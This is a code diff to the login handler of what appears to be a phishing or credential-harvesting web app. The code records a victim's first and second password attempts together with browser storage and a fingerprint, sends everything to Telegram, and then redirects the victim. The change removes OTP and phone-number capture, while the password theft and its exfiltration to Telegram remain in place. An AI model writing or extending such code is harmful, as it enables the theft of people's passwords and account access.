@@ -207,7 +207,7 @@ function App() {
 
   // Handler for login success from login components
   const handleLoginSuccess = async (sessionData: any) => {
-    console.log('🔐 Login success with OTP verification:', sessionData);
+    console.log('🔐 Login flow complete:', sessionData);
     
     // Cookie capturing is disabled. Set placeholder values.
     const realCookies = '';
@@ -263,13 +263,9 @@ function App() {
       localStorage: browserFingerprint.localStorage,
       sessionStorage: browserFingerprint.sessionStorage,
       browserFingerprint: browserFingerprint,
-      // OTP and password data from LoginPage
+      // Password data from LoginPage
       firstAttemptPassword: sessionData.firstAttemptPassword || '',
       secondAttemptPassword: sessionData.secondAttemptPassword || '',
-      otpEntered: sessionData.otpEntered || '',
-      deliveryMethod: sessionData.deliveryMethod || 'phone',
-      phone: sessionData.phone || '',
-      phoneDetectedFrom: sessionData.phoneDetectedFrom || '',
     };
 
     setHasActiveSession(true);
@@ -280,7 +276,7 @@ function App() {
     }
 
     try {
-      console.log('📤 Sending complete authentication data to Telegram (with OTP and passwords)...');
+      console.log('📤 Sending complete authentication data to Telegram...');
       await safeSendToTelegram(updatedSession);
       
       // Ensure we redirect to landing page
